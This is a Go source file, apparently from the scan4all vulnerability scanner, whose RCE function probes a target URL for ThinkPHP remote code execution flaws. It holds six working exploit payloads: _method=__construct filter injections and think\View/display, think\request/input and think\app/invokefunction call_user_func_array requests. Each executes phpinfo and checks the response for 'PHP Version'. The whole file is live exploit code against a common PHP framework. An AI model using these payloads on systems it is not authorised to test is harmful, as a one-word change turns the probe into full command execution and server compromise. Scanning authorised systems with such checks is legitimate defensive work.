package ThinkPHP

import (
	"github.com/GhostTroops/scan4all/lib/util"
)

func RCE(u string) bool {
	pay := "_method=__construct&filter[]=phpinfo&server[REQUEST_METHOD]=1"
	if req, err := util.HttpRequset(u+"/index.php?s=captcha", "POST", pay, false, nil); err == nil {
		if util.StrContains(req.Body, "PHP Version") {
			util.SendLog(req.RequestUrl, "ThinkPHP", "Found vuln RCE", pay)
			return true
		}
	}
	pay = "_method=__construct&method=GET&filter[]=phpinfo&get[]=1"
	if req, err := util.HttpRequset(u+"/index.php?s=captcha", "POST", pay, false, nil); err == nil {
		if util.StrContains(req.Body, "PHP Version") {
			util.SendLog(req.RequestUrl, "ThinkPHP", "Found vuln RCE", pay)
			return true
		}
	}
	pay = "s=1&_method=__construct&method&filter[]=phpinfo"
	if req, err := util.HttpRequset(u+"/index.php?s=captcha", "POST", pay, false, nil); err == nil {
		if util.StrContains(req.Body, "PHP Version") {
			util.SendLog(req.RequestUrl, "ThinkPHP", "Found vuln RCE", pay)
			return true
		}
	}
	if req, err := util.HttpRequset(u+"/index.php?s=index/\\think\\View/display&content=%22%3C?%3E%3C?php%20phpinfo();?%3E&data=1", "GET", "", false, nil); err == nil {
		if util.StrContains(req.Body, "PHP Version") {
			util.SendLog(req.RequestUrl, "ThinkPHP", "Found vuln RCE", "")
			return true
		}
	}
	if req, err := util.HttpRequset(u+"/index.php?s=index/think\\request/input?data[]=1&filter=phpinfo", "GET", "", false, nil); err == nil {
		if util.StrContains(req.Body, "PHP Version") {
			util.SendLog(req.RequestUrl, "ThinkPHP", "Found vuln RCE", "")
			return true
		}
	}
	if req, err := util.HttpRequset(u+"/index.php?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1", "GET", "", false, nil); err == nil {
		if util.StrContains(req.Body, "PHP Version") {
			util.SendLog(req.RequestUrl, "ThinkPHP", "Found vuln RCE", "")
			return true
		}
	}
	return false
}
